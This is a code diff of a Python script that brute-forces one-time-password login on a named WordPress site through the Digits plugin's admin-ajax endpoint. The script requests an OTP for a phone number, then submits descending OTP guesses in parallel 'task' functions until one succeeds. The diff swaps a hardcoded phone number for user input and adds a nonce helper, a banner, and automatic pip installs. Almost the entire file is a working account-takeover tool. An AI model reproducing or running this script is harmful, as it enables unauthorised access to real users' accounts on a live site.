@@ -3,10 +3,34 @@ import time
 import requests
 from colorama import Fore
 from os import system
-
+import nonce_cod
 system('cls')
 
-dig_nounce = 'c67608c48a' #dynamic code [csrf]
+print("instaling lib")
+system('pip install colorama')
+system('pip install requests')
+system('cls')
+
+def banner():
+    print(Fore.BLUE+"""
+            ███                      █████                       █████     
+           ░░░                      ░░███                       ░░███      
+ ████████  ████  ████████   ██████   ░███████   ██████   ██████  ░███ █████
+░░███░░███░░███ ░░███░░███ ░░░░░███  ░███░░███ ███░░███ ███░░███ ░███░░███ 
+ ░███ ░░░  ░███  ░███ ░░░   ███████  ░███ ░███░███ ░███░███ ░███ ░██████░  
+ ░███      ░███  ░███      ███░░███  ░███ ░███░███ ░███░███ ░███ ░███░░███ 
+ █████     █████ █████    ░░████████ ████████ ░░██████ ░░██████  ████ █████
+░░░░░     ░░░░░ ░░░░░      ░░░░░░░░ ░░░░░░░░   ░░░░░░   ░░░░░░  ░░░░ ░░░░░ 
+                                                                        (c) Rirabook . All rights reserved
+                                                                                        V.Multitask""")
+banner()
+time.sleep(3)
+
+Get_nonce = nonce_cod.nonce(start='')
+print(Get_nonce)
+
+dig_nounce = input('nonce code :') #dynamic code [csrf]
+phonenum = int(input('Phone number with out +98 :'))
 
 
 url = 'https://rirabook.com/wp-admin/admin-ajax.php'
@@ -16,7 +40,7 @@ json = {'accountkit': 0,
 
 data = {'action':'digits_check_mob',
         'countrycode':'+98',
-        'mobileNo':9050756226,
+        'mobileNo':phonenum,
         'csrf':dig_nounce,
         'login':1,
         'username':'',
@@ -26,7 +50,7 @@ data = {'action':'digits_check_mob',
         'digits':1,
         'json':1,
         'whatsapp':0,
-        'mobmail':9050756226,
+        'mobmail':phonenum,
         'dig_otp':'',
         'dig_nounce':dig_nounce,
         'digits_redirect_page':'https://rirabook.com/'}
@@ -35,20 +59,12 @@ sned_otp = requests.post(url=url,json=json,data=data).text
 
 if sned_otp == '{"accountkit":0,"firebase":0,"code":"1"}':
     print(Fore.GREEN+'[*] OTP Code Sned phone')
-    time.sleep(5)
+    time.sleep(10)
 else:
     print(Fore.RED+'[*] OTP Code Sned Fail')
     time.sleep(5)
 
-
-
-
-
-
-
 #task 1
-
-
 
 def task1():
     sh = 999999
@@ -68,7 +84,7 @@ def task1():
 
         data_vrify = {'action':'digits_verifyotp_login',
                       'countrycode':'%2B98',
-                      'mobileNo':9050756226,
+                      'mobileNo':phonenum,
                       'otp':sh,
                       'dig_ftoken':-1,
                       'csrf':dig_nounce,
@@ -85,14 +101,7 @@ def task1():
         else:
             print(Fore.RED+'[*] OTP test fail [1]')
 
-
-
-
-
 # task 2
-
-
-
 
 def task2():
     sh = 999998
@@ -112,7 +121,7 @@ def task2():
 
         data_vrify = {'action':'digits_verifyotp_login',
                       'countrycode':'%2B98',
-                      'mobileNo':9050756226,
+                      'mobileNo':phonenum,
                       'otp':sh,
                       'dig_ftoken':-1,
                       'csrf':dig_nounce,
